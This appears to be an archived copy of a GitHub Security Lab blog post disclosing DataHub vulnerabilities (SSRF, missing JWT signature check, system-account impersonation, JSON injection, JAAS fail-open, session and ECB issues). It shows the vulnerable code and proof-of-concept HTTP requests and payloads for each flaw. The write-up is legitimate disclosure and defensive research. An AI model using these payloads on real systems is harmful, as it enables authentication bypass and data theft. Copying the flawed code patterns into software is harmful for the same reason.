---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-03_github-security-lab-audited-datahub-heres-what-they-found.md
original_filename: 2023-03-03_github-security-lab-audited-datahub-heres-what-they-found.md
title: 'GitHub Security Lab audited DataHub: Here’s what they found'
category: documents
detected_topics:
- oauth
- supply-chain
- jwt
- ssrf
- xss
- command-injection
tags:
- imported
- documents
- oauth
- supply-chain
- jwt
- ssrf
- xss
- command-injection
language: en
raw_sha256: e03e6f29ec259967639144033393fc8397841ddf4ed0e216034f56842da60331
text_sha256: 24042b11b0a14e0b676c028877f2d19cce60b3a9fe7dce0b184534049f03b9ec
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: true
---

# GitHub Security Lab audited DataHub: Here’s what they found

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-03_github-security-lab-audited-datahub-heres-what-they-found.md
- Source Type: markdown
- Detected Topics: oauth, supply-chain, jwt, ssrf, xss, command-injection
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: True
- Raw SHA256: `e03e6f29ec259967639144033393fc8397841ddf4ed0e216034f56842da60331`
- Text SHA256: `24042b11b0a14e0b676c028877f2d19cce60b3a9fe7dce0b184534049f03b9ec`


## Content

---
title: "GitHub Security Lab audited DataHub: Here’s what they found"
page_title: "GitHub Security Lab audited DataHub: Here's what they found - The GitHub Blog"
url: "https://github.blog/2023-03-03-github-security-lab-audited-datahub-heres-what-they-found/"
final_url: "https://github.blog/security/vulnerability-research/github-security-lab-audited-datahub-heres-what-they-found/"
authors: ["Alvaro Muñoz (@pwntester)", "Michael Stepankin (@artsploit)", "Peter Stöckli (@ulldma)", "Kevin Stubbings", "Jorge Rosillo (@jorge_ctf)", "Sylwia Budzynska"]
programs: ["DataHub"]
bugs: ["SSRF", "Insecure deserialization", "Cypher injection", "Authentication bypass", "Authorization bypass", "XSS", "Open redirect", "JWT", "JSON injection", "Cryptographic issues", "Session expiration issue", "Security code review"]
publication_date: "2023-03-03"
added_date: "2023-03-06"
source: "pentester.land/writeups.json"
original_index: 1434
---

[Home](https://github.blog/) / [Security](https://github.blog/security/) / [Vulnerability research](https://github.blog/security/vulnerability-research/)

# GitHub Security Lab audited DataHub: Here’s what they found

The GitHub Security Lab audited DataHub, an open source metadata platform, and discovered several vulnerabilities in the platform’s authentication and authorization modules. These vulnerabilities could have enabled an attacker to bypass authentication and gain access to sensitive data stored on the platform.

![](https://github.blog/wp-content/uploads/2021/11/GitHub-Security-Lab.jpeg?resize=1200%2C630)

[Alvaro Munoz](https://github.blog/author/pwntester/ "Posts by Alvaro Munoz")·[@pwntester](https://github.com/pwntester)

March 3, 2023 

| 22 minutes 

  * Share: 
  * [ ](https://x.com/share?text=GitHub%20Security%20Lab%20audited%20DataHub%3A%20Here%26%238217%3Bs%20what%20they%20found&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fgithub-security-lab-audited-datahub-heres-what-they-found%2F)
  * [ ](https://www.facebook.com/sharer/sharer.php?t=GitHub%20Security%20Lab%20audited%20DataHub%3A%20Here%26%238217%3Bs%20what%20they%20found&u=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fgithub-security-lab-audited-datahub-heres-what-they-found%2F)
  * [ ](https://www.linkedin.com/shareArticle?title=GitHub%20Security%20Lab%20audited%20DataHub%3A%20Here%26%238217%3Bs%20what%20they%20found&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fgithub-security-lab-audited-datahub-heres-what-they-found%2F)

At GitHub, we really care about open source security and love to help maintainers to secure their code. That is indeed the mission of the GitHub Security Lab. As users of open source software (OSS), we also love to contribute back to the community by helping improve the security posture of the OSS we use to build GitHub. That was the case when the GitHub Security Lab audited DataHub, an open source metadata platform that enables data discovery, data observability, and federated governance. Hundreds of organizations around the world, including GitHub, use this platform to manage their organization’s metadata. Through our audit, we discovered several vulnerabilities in the platform’s authentication and authorization modules, which could have enabled an attacker to bypass authentication and gain access to sensitive data stored on the platform.

We also identified several other vulnerabilities, such as Unsafe Deserialization, JSON Injection, Server-Side Request Forgery, and Cross-Site Scripting (XSS). All of these vulnerabilities could have been leveraged to compromise user accounts, gain access to sensitive data, and perform other malicious activities.

We reported all the vulnerabilities to the vendor and worked closely with their development team to quickly patch them. In this blog, we will walk you through the vulnerabilities in detail, explaining how we found them, and what their impact was.

## Impact

The following vulnerabilities have been fixed in version 0.8.45:

  * [SSRF/XSS](https://github.com/datahub-project/datahub/security/advisories/GHSA-5w2h-q83m-65xg) (CVE-2023-25557) CVSS: 7.5
  * [Missing JWT signature check](https://github.com/datahub-project/datahub/security/advisories/GHSA-r8gm-v65f-c973) (CVE-2022-39366) CVSS: 9.9
  * [System account impersonation](https://github.com/datahub-project/datahub/security/advisories/GHSA-qgp2-qr66-j8r8) (CVE-2023-25559) CVSS: 8.2
  * [JSON Injection](https://github.com/datahub-project/datahub/security/advisories/GHSA-6rpf-5cfg-h8f3) (CVE-2023-25560) CVSS: 8.2
  * [Login fail open on JAAS misconfiguration](https://github.com/datahub-project/datahub/security/advisories/GHSA-7wc6-p6c4-522c) (CVE-2023-25561) CVSS: 6.9
  * [Failure to Invalidate Session on Logout](https://github.com/datahub-project/datahub/security/advisories/GHSA-3974-hxjh-m3jj) (CVE-2023-25562) CVSS: 6.9

The following vulnerability was fixed in version 0.9.5:

  * [Deserialization of untrusted data](https://github.com/datahub-project/datahub/security/advisories/GHSA-hrwp-2q5c-86wv) (CVE-2023-25558) CVSS: 7.5

The following vulnerabilities have been deemed as not an issue or not fixed:

  * Open Redirect (`GHSL-2022-077`)
  * AES used in ECB mode (`GHSL-2022-082`)
  * Multiple Cypher injections in Neo4JGraphService (`GHSL-2022-087`)

Most of the vulnerabilities were found in the authentication and authorization systems, which would allow attackers to bypass them.

In addition, we found that PAC4J before version 4.0 could lead to an unsafe deserialization vulnerability. This issue was assigned _CVE-2023-25581_.

# DataHub architecture

Before jumping into the details of the vulnerabilities we found, it is important to have a good understanding of how DataHub is architected. The following diagram describes a high-level architecture of DataHub:

![Architecture diagram of DataHub](https://github.blog/wp-content/uploads/2023/03/datahub-architecture.png?w=1024&resize=1024%2C572)

_Source:<https://datahubproject.io/docs/architecture/architecture/>_

The most important components are:

  * Frontend (DataHub frontend): React UI for discovering, governing, and debugging the data.
  * Backend (DataHub serving): the most important component of the backend is the GMS or metadata store. The Metadata Store is responsible for storing the entities and aspects comprising the Metadata Graph. This includes exposing an API for ingesting metadata, fetching Metadata by primary key, searching entities, and fetching relationships between entities. It consists of a Spring Java Service hosting a set of [Rest.li](https://linkedin.github.io/rest.li/) API endpoints, along with MySQL, Elasticsearch, andKafka for primary storage & indexing.

As we will see, some of the vulnerabilities lay in integration of these two components.

## Vulnerability details

In the following sections, we will describe the vulnerabilities found through manual- and CodeQL-driven analysis. We will detail how these vulnerabilities could have been leveraged to bypass the authentication and authorization systems.

  * **SSRF/XSS** (`GHSL-2022-076/CVE-2023-25557`). An SSRF vulnerability exists in DataHub’s Frontend proxy allowing external users to reroute requests from DataHub Frontend to arbitrary hosts. Alternatively, this also can be exploited as a Cross-Site Scripting (XSS) vulnerability.
  * **Open Redirect** (`GHSL-2022-077/WONT FIX`). An Open redirect vulnerability exists in DataHub’s frontend.
  * **Missing JWT signature check** (`GHSL-2022-078/CVE-2022-39366`). DataHub’s Backend (GMS) does not verify the cryptographic signature of JWT tokens. This allows an attacker to connect to DataHub instances as any user if Metadata Service authentication is enabled.
  * **System account impersonation** (`GHSL-2022-079/CVE-2023-25559`). When not using authentication for the metadata service (default configuration), the `NoOpAuthenticator` will use the `X-DataHub-Actor` header and use it as the user to authorize requests with.
  * **JSON Injection** (`GHSL-2022-080/CVE-2023-25560`). DataHub’s frontend crafts multiple JSON strings using format strings. An attacker may be able to inject arbitrary fields in the JSON string that may shadow values added by the frontend.
  * **Login fails open on Java Authentication and Authorization Service (JAAS) misconfiguration** (`GHSL-2022-081/CVE-2023-25561`). If JAAS authentication is used and the given configuration file contains an error, the authentication fails open and allows an attacker to login as any user using any password.
  * **AES used in ECB mode** (`GHSL-2022-082/WONT FIX`). The `SecretUtils` and `SecretService` classes of the DataHub backend use AES in ECB mode to encrypt DataHub secrets.
  * **Failure to Invalidate Session on Logout** (`GHSL-2022-083/CVE-2023-25562`). Session cookies issued by DataHub’s frontend are cleared on logout, but they are still considered as valid session cookies.
  * **Deserialization of untrusted data** (`GHSL-2022-086/CVE-2023-25558`). DataHub uses an outdated version of pac4j library and is therefore affected by Deserialization of Untrusted Data vulnerability when processing the “nonce” parameter.
  * **Multiple Cypher injections in Neo4JGraphService** (`GHSL-2022-087/WONT FIX`). NoSQL injections exist in the `/api/v2/graphql` frontend endpoint and the `/relationships` backend endpoint that may allow attackers to read the Neo4J database, wipe it out, or initiate a SSRF attack.

## SSRF/XSS (`GHSL-2022-076`)

As we saw in the architecture diagram, DataHub has a frontend component that communicates with the backend through REST and GraphQL. However, the frontend also acts as a proxy able to forward any REST or GraphQL requests to the backend. This is handled by the DataHub Frontend Proxy. This proxy is a user-facing component of the DataHub frontend itself. The goal of this proxy is to perform authentication if needed and forward HTTP requests to the DataHub Metadata Store (GMS). The code responsible for this proxy is located at the `controllers.Application.proxy()` method of the DataHub Frontend Proxy. By looking at how this method handles the forwarding of requests, we discovered that it does not adequately construct the URL when forwarding data to GMS, allowing external users to reroute requests from the DataHub Frontend to any arbitrary hosts. Specifically, there are two factors that make the application vulnerable:

  * The user-controllable path (`resolvedUri`) is concatenated directly after the port without a forward slash  
([source](https://github.com/datahub-project/datahub/blob/461406a0908b0638d4efa05e926195b2539ba918/datahub-frontend/app/controllers/Application.java#L117-L119))

  
  
  return _ws.url(String.format("%s://%s:%s%s", protocol, metadataServiceHost, metadataServicePort, resolvedUri))
  .setMethod(request().method())
  .setHeaders(request()
  

  * If the path starts with `/api/gms`, the application will extract the string following `/api/gms` from the request Uri into the `resolvedUri` variable  
([source](https://github.com/datahub-project/datahub/blob/461406a0908b0638d4efa05e926195b2539ba918/datahub-frontend/app/controllers/Application.java#L305-L309))

  
  
  final String resolvedUri = mapPath(request().uri());
  ...
  
  private String mapPath(@Nonnull final String path) {
  // Case 1: Map legacy GraphQL path to GMS GraphQL API (for compatibility)
  if (path.equals("/api/v2/graphql")) {
  return "/api/graphql";
  }
  
  // Case 2: Map requests to /gms to / (Rest.li API)
  final String gmsApiPath = "/api/gms";
  if (path.startsWith(gmsApiPath)) {
  return String.format("%s", path.substring(gmsApiPath.length()));
  }
  
  // Otherwise, return original path
  return path;
  }
  

So, a request to `https://datahub-frontent:9002/api/gms/anything` is forwarded to `https://datahub-gms:8800/anything`, which is the expected behavior.

However, when `/api/gms` is not followed by a slash, as in this case, everything after `/api/gms` will be concatenated with the GMS port part of the URL. From the attacker’s perspective, it’s possible to use the `@` character to break URL parsing logic and “smuggle” another hostname:

A request `https://datahub-frontent:9002/api/gms@example.com/123` will be forwarded to `https://datahub-gms:8800@example.com/123`, where `example.com` is a host, `datahub-gms` is a username and `8800` is a password.

### Impact

This results in the ability to reroute a request originating from the frontend proxy to any other server and return the result. This is known as a Server-Side Request Forgery (SSRF) vulnerability. In many cases, SSRF can be utilized to access internal hosts as well as remote hosts. The ability to fully read the response increases the overall risk of this vulnerability.

This vulnerability can be exploited as SSRF to induce arbitrary HTTP requests to internal-only servers, which can lead to sensitive information disclosure or data modification.

Alternatively, this also can be exploited as Cross-Site Scripting (XSS), as an attacker is able to reroute a request to their server and return a page with malicious JavaScript code. Since the browser receives this data directly from the DataHub Frontend proxy, this JavaScript code will be executed with the origin of the DataHub application.

Normally, an attacker should have a valid cookie to send any requests to frontend’s `/api/gms`, which limits the likelihood of exploitation of the vulnerability. At the same time, if the metadata service authentication is enabled on the frontend proxy, this SSRF can be exploited without a valid cookie but with an empty `Authorization` header, as the frontend proxy [only checks its presence](https://github.com/datahub-project/datahub/blob/461406a0908b0638d4efa05e926195b2539ba918/datahub-frontend/app/auth/AuthUtils.java#L66-L68) but not the value.

### Proof of concept

The following request will be forwarded to the `example.com` domain and its response will be forwarded back to the user coming from the datahub origin:
  
  
  GET /api/gms@example.com HTTP/1.1
  Host: datahub-frontend:9002
  Authorization: 
  Connection: close
  

**Response** :

![](https://github.blog/wp-content/uploads/2023/03/unnamed-1.png?w=1004&resize=1004%2C550)

## Open Redirect (`GHSL-2022-077`)

The frontend controller is written using the Play framework, which was not modeled with CodeQL. Once that we figured out that the untrusted data is returned from the `Http$Request` object returned by calling the `request()` method, we modeled it with CodeQL:
  
  
  class PlayRequestAccess extends RemoteFlowSource {
  PlayRequestAccess() {
  exists(MethodAccess ma |
  ma.getMethod()
  .getDeclaringType()
  .getASourceSupertype*()
  .hasQualifiedName("play.mvc", ["Http$Request", "Http$RequestHeader"]) and
  ma.getMethod().getName() =
  [
  "body", "cookie", "cookies", "flash", "getCookie", "getHeaders", "getQueryString",
  "header", "host", "path", "queryString", "uri"
  ] and
  ma = this.asExpr()
  )
  }
  
  override string getSourceType() { result = "PlayRequest" }
  }
  

By tracking where this tainted data flowed to, we quickly identified that the `[AuthenticationController.authenticate()](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/datahub-frontend/app/controllers/AuthenticationController.java#L80)` method used the `redirect_uri` query parameter to redirect authenticated users to any arbitrary location.
  
  
  final Optional<String> maybeRedirectPath = Optional.ofNullable(ctx().request().getQueryString(AUTH_REDIRECT_URI_PARAM));
  final String redirectPath = maybeRedirectPath.orElse("/");
  if (AuthUtils.hasValidSessionCookie(ctx())) {
  return redirect(redirectPath);
  }
  

### Impact

This issue may lead to an Open Redirect vulnerability where a logged-in user may be tricked into following a link such as `http://datahub-server/authenticate?redirect_uri=https://attacker.com/` where the attacker may present a fake login page to steal the victim’s credentials.

## Missing JWT signature check (`GHSL-2022-078`)

Continuing with CodeQL, the out-of-the-box queries returned an interesting issue. The `Missing JWT signature check` query, which community member, [Simon Gerst](https://github.com/intrigus-lgtm), [contributed](https://github.com/github/securitylab/issues/333) through [our bug bounty program](https://securitylab.github.com/bounties/), reported a critical issue: the `[StatelessTokenService](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/metadata-service/auth-impl/src/main/java/com/datahub/authentication/token/StatelessTokenService.java#L30)` of the DataHub metadata service (GMS) was not verifying the signature of JWT tokens. The vulnerability lies in the fact that the `StatelessTokenService` of the Metadata service uses the `[parse()](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/metadata-service/auth-impl/src/main/java/com/datahub/authentication/token/StatelessTokenService.java#L134)` method of the `io.jsonwebtoken.JwtParser` class.
  
  
  final Claims claims = (Claims) Jwts.parserBuilder()
  .setSigningKey(base64Key)
  .build()
  .parse(accessToken)
  .getBody();
  

The `parse()` method does not perform any verification of the cryptographic token signature as stated in the [documentation](https://codeql.github.com/codeql-query-help/java/java-missing-jwt-signature-check/):

_It offers different methods for parsing tokens like`parse`, `parseClaimsJws`, and `parsePlaintextJws`. The last two correctly verify that the JWT is properly signed.Unfortunately, the parse method accepts a JWT whose signature is empty although a signing key has been set for the parser. This means that an attacker can create arbitrary JWTs that will be accepted if this method is used._

### Impact

The lack of signature verification means that JWTs are accepted regardless of the used algorithm. Therefore, it allows an attacker to connect to DataHub instances as any arbitrary user, including the system one, when the Metadata Service authentication is enabled.

### Proof of concept

![](https://github.blog/wp-content/uploads/2023/03/unnamed-2.png?w=1024&resize=1024%2C576)

Sending any GraphQL query using this token will get the request accepted as if it was correctly signed with a token for the system use:
  
  
  POST /api/graphql HTTP/1.1
  Host: datahub-frontend:9002
  Authorization: Bearer ***REDACTED***
  Content-Type: application/json
  Connection: close
  {"query":"{
  me {
  corpUser {
  username
  }
  }
  }",
  "variables":{}
  }
  

Actually, since the signature is not verified we can remove it all together!

<https://github.blog/wp-content/uploads/2023/03/218753800-b044a7e7-2c08-492d-8141-445b44184725_AdobeExpress.mp4#t=0.001>

## System account impersonation (`GHSL-2022-079`)

When looking at the code of the frontend proxy, there was a comment that got our attention:
  
  
  // Remove X-DataHub-Actor to prevent malicious delegation.
  

The surrounding code for context looked the following:
  
  
  return _ws.url(String.format("%s://%s:%s%s", protocol, metadataServiceHost, metadataServicePort, resolvedUri))
  .setMethod(request().method())
  .setHeaders(request()
  .getHeaders()
  .toMap()
  .entrySet()
  .stream()
  // Remove X-DataHub-Actor to prevent malicious delegation.
  .filter(entry -> !AuthenticationConstants.LEGACY_X_DATAHUB_ACTOR_HEADER.equals(entry.getKey()))
  ...
  .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue))
  )
  ...
  .addHeader(AuthenticationConstants.LEGACY_X_DATAHUB_ACTOR_HEADER, getDataHubActorHeader())
  

So, what is this `AuthenticationConstants.LEGACY_X_DATAHUB_ACTOR_HEADER` header for? Turns out that when not using authentication for the metadata service, which is the default configuration, the Metadata service (GMS) will use the `X-DataHub-Actor` HTTP header to infer the user the frontend is sending the request on behalf of. Any requests to be proxied should get this header [stripped out](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/datahub-frontend/app/controllers/Application.java#L118) and [replaced](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/datahub-frontend/app/controllers/Application.java#L125) with a new `X-DataHub-Actor` header for the current logged-in user.

That feature looked like an interesting target. Looking closer into the removal line, we can see that it is done based on a case-sensitive check (`equals()`). However, when the backends retrieves the header, its name is retrieved in a [case-insensitive](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/metadata-service/auth-api/src/main/java/com/datahub/authentication/AuthenticationRequest.java#L30) way:
  
  
  public class AuthenticationRequest {
  
  private final Map<String, String> caseInsensitiveHeaders;
  
  public AuthenticationRequest(@Nonnull final Map<String, String> requestHeaders) {
  Objects.requireNonNull(requestHeaders);
  caseInsensitiveHeaders = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);
  caseInsensitiveHeaders.putAll(requestHeaders);
  }
  
  /**
  * Returns a case-insensitive map of the inbound request's headers.
  */
  @Nonnull
  public Map<String, String> getRequestHeaders() {
  return this.caseInsensitiveHeaders;
  }
  }
  

An attacker can use this case differential to smuggle an `X-DataHub-Actor` header with different casing (for example, `X-DATAHUB-ACTOR`).

### Impact

This issue may lead to an authorization bypass which allows any user to impersonate the system user account and perform any actions on its behalf.

### Proof of concept

To prove our point, we will try to request an invite token (an action that only the system account can do) as a regular user:
  
  
  POST /api/v2/graphql HTTP/1.1
  Host: datahub-frontend:9002
  Content-Length: 175
  Cookie: PLAY_SESSION=c6a3f3792d063f74ce7e00d510c2e4434bfe6727-actor=urn%3Ali%3Acorpuser%3Atest&token=eyJhbGciOiJIUzI1NiJ9.eyJhY3RvclR5cGUiOiJVU0VSIiwiYWN0b3JJZCI6InRlc3QiLCJ0eXBlIjoiU0VTU0lPTiIsInZlcnNpb24iOiIxIiwianRpIjoiODNmM2RhZmUtZWQ4OC00ZjZkLWEzOTctZDFiZDUyOGI0ZmJjIiwic3ViIjoidGVzdCIsImV4cCI6MTY2Mzg3ODMwNSwiaXNzIjoiZGF0YWh1Yi1tZXRhZGF0YS1zZXJ2aWNlIn0.7MTTZLQQEHJ_3RiQgIgo4q5K6gKikqwA7LgLVKxr3pI; actor=urn:li:corpuser:test
  
  {"operationName":"getNativeUserInviteToken","variables":{},"query":"query getNativeUserInviteToken {\n getNativeUserInviteToken {\n  inviteToken\n __typename\n}\n}\n"}
  

As we can see in the response below, the request was deemed invalid as the regular user was unauthorized to perform this action:
  
  
  HTTP/1.1 200 OK
  Date: Wed, 21 Sep 2022 20:37:53 GMT
  Server: Jetty (9.4.46.v20220331)
  Connection: close
  Content-Type: application/json
  Content-Length: 324
  
  {"errors":[{"message":"Unauthorized to perform this action. Please contact your DataHub administrator.","locations":[{"line":2,"column":3}],"path":["getNativeUserInviteToken"],"extensions":{"code":403,"type":"UNAUTHORIZED","classification":"DataFetchingException"}}],"data":{"getNativeUserInviteToken":null},"extensions":{}}
  

Lets add the `X-DATAHUB-ACTOR: urn:li:corpuser:__datahub_system` header and check again:
  
  
  POST /api/v2/graphql HTTP/1.1
  Host: datahub-frontend:9002
  Content-Length: 175
  Cookie: PLAY_SESSION=c6a3f3792d063f74ce7e00d510c2e4434bfe6727-actor=urn%3Ali%3Acorpuser%3Atest&token=eyJhbGciOiJIUzI1NiJ9.eyJhY3RvclR5cGUiOiJVU0VSIiwiYWN0b3JJZCI6InRlc3QiLCJ0eXBlIjoiU0VTU0lPTiIsInZlcnNpb24iOiIxIiwianRpIjoiODNmM2RhZmUtZWQ4OC00ZjZkLWEzOTctZDFiZDUyOGI0ZmJjIiwic3ViIjoidGVzdCIsImV4cCI6MTY2Mzg3ODMwNSwiaXNzIjoiZGF0YWh1Yi1tZXRhZGF0YS1zZXJ2aWNlIn0.7MTTZLQQEHJ_3RiQgIgo4q5K6gKikqwA7LgLVKxr3pI; actor=urn:li:corpuser:test
  X-DATAHUB-ACTOR: urn:li:corpuser:__datahub_system
  
  {"operationName":"getNativeUserInviteToken","variables":{},"query":"query getNativeUserInviteToken {\n  getNativeUserInviteToken {\n  inviteToken\n __typename\n  }\n}\n"}
  

This time, the request is deemed valid and the invite token is returned:
  
  
  HTTP/1.1 200 OK
  Date: Wed, 21 Sep 2022 20:40:17 GMT
  Server: Jetty (9.4.46.v20220331)
  Content-Type: application/json
  Content-Length: 131
  
  {"data":{"getNativeUserInviteToken":{"inviteToken":"oeuvkjqnntzcjngkgnirdxzpjizbgomu","__typename":"InviteToken"}},"extensions":{}}
  

Let’s look at what happened here:

  * An authenticated user sends a request to the frontend proxy with the malicious header impersonating the `__datahub_system` account.
  * Because the header is in all-upper-case, the header will not get stripped out.
  * The application adds a new header with the same name but using camel-case instead.
  * When the HTTP client (Play WS Client) prepares the request to be sent, it will find two headers with similar names and will try to deduplicate them. For that, it will remove one of the headers based on the casing. 
  * By making our header all-upper-case, we can force the Play WS client to keep our header and discard the system-set one.
  * The backend will receive our all-upper-case header, but when checking if it is present, it will do so in a case insensitive way and therefore, treating it as a valid header.

Note that if the attacker has access to the backend service, then the `PLAY_SESSION` cookie is not needed. By adding the `X-DataHub-Actor` header, the attacker will be able to impersonate the system account without any authentication (pre-authenticated).

## JSON Injection (`GHSL-2022-080`)

Taking another look at the way that the frontend and backend communicates, we uncovered a new vulnerability. The `[AuthServiceClient](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/datahub-frontend/app/client/AuthServiceClient.java)`, which is responsible for creation of new accounts, verifying credentials, resetting them or requesting access tokens, crafts multiple JSON strings using format strings with user-controlled data. Here are some examples:
  
  
  String json = String.format("{ \"%s\":\"%s\" }", USER_ID_FIELD, userId);
  
  ...
  
  String json = String.format("{ \"%s\":\"%s\", \"%s\":\"%s\", \"%s\":\"%s\", \"%s\":\"%s\", \"%s\":\"%s\", \"%s\":\"%s\" }",
  USER_URN_FIELD, userUrn, FULL_NAME_FIELD, fullName, EMAIL_FIELD, email, TITLE_FIELD, title,
  PASSWORD_FIELD, password, INVITE_TOKEN_FIELD, inviteToken);
  
  ...
  
  String json = String.format("{ \"%s\":\"%s\", \"%s\":\"%s\", \"%s\":\"%s\" }", USER_URN_FIELD, userUrn, PASSWORD_FIELD, password, RESET_TOKEN_FIELD, resetToken);
  
  ...
  
  String json = String.format("{ \"%s\":\"%s\", \"%s\":\"%s\" }", USER_URN_FIELD, userUrn, PASSWORD_FIELD, password); request.setEntity(new StringEntity(json));
  
  ...
  

This means that an attacker should be able to augment these JSON strings to be sent to the backend and that can potentially be abused by including new or colliding values.

Looking at how these JSON strings are processed by the backend, we can see that they were parsed using the [Jackson](https://github.com/FasterXML/jackson) library. An attacker may be able to inject arbitrary fields in the JSON string that may shadow values added by the frontend. In case of colliding keys, the Jackson library will use the one appearing the last in the string.

### Impact

This issue may lead to an authentication bypass and the creation of system accounts, which effectively can lead to full system compromise.

### Proof of concept: generating JWT tokens for arbitrary accounts

A user with credentials `test` and password `test` may send the following request to the login endpoint:
  
  
  POST /logIn HTTP/1.1
  Host: datahub-frontend:9002
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type: application/json
  Content-Length: 70
  
  {"username":"test\", \"userId\":\"__datahub_system", "password":"test"}
  

This will turn into two calls to the backend:

  * The first call to the `/verifyNativeUserCredentials` endpoint will be successful since it will check for the existence of the account specified by the `userUrn` and the `test` account exists.

  
  
  {
  "userUrn":"urn:li:corpuser:test",
  "userId":"__datahub_system",
  "password":"test"
  }
  

  * The second call to the `/generateSessionTokenForUser` endpoint will have two `userId` keys. The backend will generate a token for the last `userId` it finds, in this case, the `__datahub_system` user id. 

  
  
  {
  "userId":"test",
  "userId":"__datahub_system"
  }
  

Note that even though the attack is successful, the resulting `PLAY_SESSION` cookie won’t be returned to the attacker since it will contain invalid characters.

### Proof of concept: create account for system user

A user with an invite token (may have received an email to sign up to the system as a regular user) can create a system account by sending the following email address:
  
  
  test@test.com\",\"userUrn\":\"urn:li:corpuser:__datahub_system
  

The request to create such account looks like:
  
  
  POST /signUp HTTP/1.1
  Host: datahub-frontend:9002
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type: application/json
  Content-Length: 131
  
  {"fullName":"test","email":"test@test.com\",\"userUrn\":\"urn:li:corpuser:__datahub_system","password":"test","title":"Manager","inviteToken":"<invite_token>"}
  

This will result in a new user with URN `urn:li:corpuser:__datahub_system` being created. Since this is the special URN used to identify the system account, any request from the newly created user account will be considered as if they were coming from the system account.

Note that an injection is not necessary in this case, since there is nothing preventing an attacker with an invite token from using a email address like `__datahub_system` which will result in a system account URN:
  
  
  POST /signUp HTTP/1.1
  Host: datahub-frontend:9002
  X-DATAHUB-ACTOR: urn:li:corpuser:__datahub_system
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type: application/json
  Content-Length: 131
  
  {"fullName":"test", "title":"test", "email":"__datahub_system", "password":"test", "inviteToken":"qxhemjniqozbovjqfkkuockqdjooxqgb"}
  

## Login fail open on JAAS misconfiguration (`GHSL-2022-081`)

Focusing on the authentication module once again, we spotted that, if Java Authentication and Authorization Service (JAAS) authentication is used and the given configuration contains an error, the authentication would fail to open and allow an attacker to login using any username and password.

This is because exceptions are not correctly handled in the `[authenticateJaasUser](https://github.com/datahub-project/datahub/blob/fdf4e48495f083314f59c414bcc7c2601633a2b8/datahub-frontend/app/security/AuthenticationManager.java#L26)` method:
  
  
  public static void authenticateJaasUser(@Nonnull String userName, @Nonnull String password) throws NamingException {
  Preconditions.checkArgument(!StringUtils.isAnyEmpty(userName), "Username cannot be empty");
  try {
  JAASLoginService jaasLoginService = new JAASLoginService("WHZ-Authentication");
  PropertyUserStoreManager propertyUserStoreManager = new PropertyUserStoreManager();
  propertyUserStoreManager.start();
  jaasLoginService.setBeans(Collections.singletonList(propertyUserStoreManager));
  JAASLoginService.INSTANCE.set(jaasLoginService);
  LoginContext lc = new LoginContext("WHZ-Authentication", new WHZCallbackHandler(userName, password));
  lc.login();
  } catch (LoginException le) {
  throw new AuthenticationException(le.toString());
  } catch (Exception e) {
  // Bad abstract class design, empty doStart that has throws Exception in the signature and subclass that also
  // does not throw any checked exceptions. This should never happen, all it does is create an empty HashMap...
  }
  }
  

As we can see, the only handled exception that would throw an `AuthenticationException` is the `LoginException`. If, for whatever reason, any other exception occurs, it will be swallowed by the empty catch-all block, and the login process will continue successfully.

One way to trigger a non-`LoginException` exception is if a JAAS configuration (for example, in the file `jaas.conf`) contains an error. In that case, an `IOException` will be thrown on [this line](https://github.com/datahub-project/datahub/blob/fdf4e48495f083314f59c414bcc7c2601633a2b8/datahub-frontend/app/security/AuthenticationManager.java#L34) and the authentication process will be successful.

### Impact

This issue may lead to an authentication bypass if an invalid JASS configuration is used.

### Proof of Concept

We can reproduce this by replacing the contents of the `jaas.conf` file with the following correct-looking configuration (missing a semicolon):
  
  
  WHZ-Authentication {
  com.sun.security.auth.module.LdapLoginModule sufficient
  userProvider="ldap://192.168.0.1:636"
  authIdentity="{USERNAME}"
  userFilter="(&(objectClass=person)(uid={USERNAME}))"
  java.naming.security.authentication="simple"
  debug="true"
  };
  

If developers were to verify that the LDAP integration works, they will flag it as a passing test. However, not just those usernames/passwords will be valid, any username/password combinations will be accepted as well!

## AES used in ECB mode (`GHSL-2022-082`)

Another issue caught by CodeQL right out-of-the-box queries, was an insecure encryption mode was being used to encrypt secrets. The `[SecretUtils](https://github.com/datahub-project/datahub/blob/dfeced8eee17e0156ae6cd05e289ac6ad26627cb/datahub-graphql-core/src/main/java/com/linkedin/datahub/graphql/resolvers/ingest/secret/SecretUtils.java)` and the `[SecretService](https://github.com/datahub-project/datahub/blob/6232447ecf4a8527ad6a58348bf3af1058ec1570/metadata-io/src/main/java/com/linkedin/metadata/secret/SecretService.java#L34)` classes of DataHub use AES in [ECB mode](https://github.com/datahub-project/datahub/blob/dfeced8eee17e0156ae6cd05e289ac6ad26627cb/datahub-graphql-core/src/main/java/com/linkedin/datahub/graphql/resolvers/ingest/secret/SecretUtils.java#L31) to encrypt DataHub secrets. AES in ECB mode is typically not recommended since the same input data will produce the same output data. We reported this issue as informational with a very low impact.

### Impact

This issue may lead to information disclosure.

## Failure to Invalidate Session on Logout (`GHSL-2022-083`)

While testing the authentication system, we realized that our Burp repeater requests were still valid even after logging out the session. Looking at the code we realized that session cookies were only _cleared_ on new [sign-ins](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/datahub-frontend/app/controllers/AuthenticationController.java#L136) but they were not cleared in the event of a logout.

